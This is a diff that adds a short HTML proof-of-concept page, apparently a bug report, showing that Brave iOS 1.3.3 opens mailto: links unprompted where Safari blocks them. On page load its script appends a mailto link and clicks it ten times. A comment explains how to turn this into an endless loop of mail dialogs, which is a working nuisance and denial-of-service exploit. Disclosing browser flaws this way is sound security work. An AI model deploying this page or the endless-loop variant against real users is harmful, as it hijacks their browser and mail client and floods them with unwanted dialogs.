@@ -1,0 +1,28 @@
+<html>
+
+<!-- Head -->
+<head>
+	<title>Mailto PoC</title>
+	<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
+</head>
+
+<!-- Body -->
+<body>
+	<p id="result" style="color:red"></p>
+	<p>PoC Test v.02</p>
+	<p>In Brave iOS version 1.3.3 (17.05.10.13), this site will open new mailto: links. Safari properly blocks spawning mail dialogs.</p>
+</body>
+
+<!-- Exploit -->
+<script type="text/javascript">
+$(window).on("load", function() {
+jQuery('#result').append('<a href="mailto:exploit@apple.com?subject=Mailto:%20spam%20PoC">.</a>');
+c = 0;
+while(c < 10) {
+	document.querySelector('a').click();
+	c++; //Comment out this increment to perform an endless loop of mailto
+}
+});
+</script>
+
+</html>
